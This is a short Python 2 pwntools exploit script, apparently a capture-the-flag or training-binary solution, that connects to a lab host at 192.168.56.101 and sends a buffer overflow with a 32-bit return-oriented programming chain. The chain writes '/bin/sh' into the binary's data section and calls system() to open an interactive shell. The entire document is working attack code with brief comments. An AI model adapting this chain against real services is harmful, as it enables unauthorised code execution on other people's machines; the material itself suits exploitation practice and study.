#!/usr/bin/env python2
from pwn import *
import struct


#context.log_level = 'DEBUG'
p = remote("192.168.56.101", 32812)
p.recvuntil('>')

system_plt = p32(0x8048430)
data_section = p32(0x804a028)
data_section2 = p32(0x804a02c)
pop2ret = p32(0x80486da)     # pop edi; pop ebp; ret
mov_edi_ebp = p32(0x8048670) # mov [edi], ebp; ret

buf = "A"*44
buf += pop2ret
# put data_section into edi
buf += data_section
# put '/bin' into ebp
buf += "/bin"
# moves '/bin' from ebp into the address pointed to by edi (data_section)
buf += mov_edi_ebp
buf += pop2ret
# put data_section+4 into edi
buf += data_section2
buf += "/sh\x00"
# moves '/sh from ebp into data_section3
buf += mov_edi_ebp
buf += system_plt
buf += "BBBB" #never returns
buf += data_section

p.sendline(buf)
p.interactive()

